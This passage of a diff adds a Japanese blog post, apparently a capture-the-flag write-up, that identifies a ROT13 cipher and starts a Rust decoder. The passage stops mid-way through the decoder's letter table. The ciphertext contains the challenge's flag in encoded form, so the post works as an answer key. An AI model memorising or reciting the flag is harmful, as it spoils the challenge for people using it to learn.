+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;　3つもあれば規則性を叩き出せるだろうと考えてみると、なるほど分かった。13個ずれている。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nopqrstuvwxyzabcdefghijklm&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijklmnopqrstuvwxyz&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　13個ずらすと、仮置きを満たすような並びになっている。これを元に順番に読んでいくと確かに文章になっているようだった。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EBG KVVV vf n fvzcyr yrggre fhofgvghgvba pvcure&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROT XIII is a simple letter substitution cipher&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　なるほど。どうやらこれは &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROT13&lt;/code&gt; と呼ばれる暗号文らしい。調べてみるとwikiも存在したので、正解と思われる。&lt;/p&gt;
+
+&lt;p&gt;　ROT13 とはまさに13個ずらして作る暗号文であるようだ。&lt;/p&gt;
+
+&lt;h3 id=&quot;解く&quot;&gt;解く&lt;/h3&gt;
+&lt;p&gt;　規則性が分かったので、一文字ずつ解いていっても良いが、せっかくなのでプログラムを書く。最近Rustの勉強をしており、丁度良い題材である。&lt;/p&gt;
+
+&lt;p&gt;　というわけで、プログラムを書いた。&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptogram&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EBG KVVV vf n fvzcyr yrggre fhofgvghgvba pvcure gung ercynprf n yrggre jvgu gur yrggre KVVV yrggref nsgre vg va gur nycunorg. EBG KVVV vf na rknzcyr bs gur Pnrfne pvcure, qrirybcrq va napvrag Ebzr. Synt vf SYNTFjmtkOWFNZdjkkNH. Vafreg na haqrefpber vzzrqvngryl nsgre SYNT.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptogram&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.as_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'b'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'o'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'c'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'p'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'d'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'q'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'e'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'f'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'g'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'t'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'h'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'u'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'i'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'v'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'j'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'k'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'l'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'m'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'n'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'o'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'b'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'p'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'q'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'r'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'s'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'f'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'t'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'g'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'u'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'h'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'v'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'w'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'j'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'x'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'k'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'y'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'l'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'z'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'m'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'N'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'B'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'O'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'C'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'P'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'D'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'Q'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'E'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'R'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'F'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'S'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'G'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'T'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'H'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'U'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'I'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'V'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'J'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'W'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'K'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'X'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'L'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'Y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'M'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'Z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'N'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'O'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'B'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'P'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'C'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'Q'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'D'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'R'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'E'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'S'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'F'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'T'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'G'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'U'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'H'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'V'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'W'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'J'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'X'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'K'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;sc&quot;&gt;'Y'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'L'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
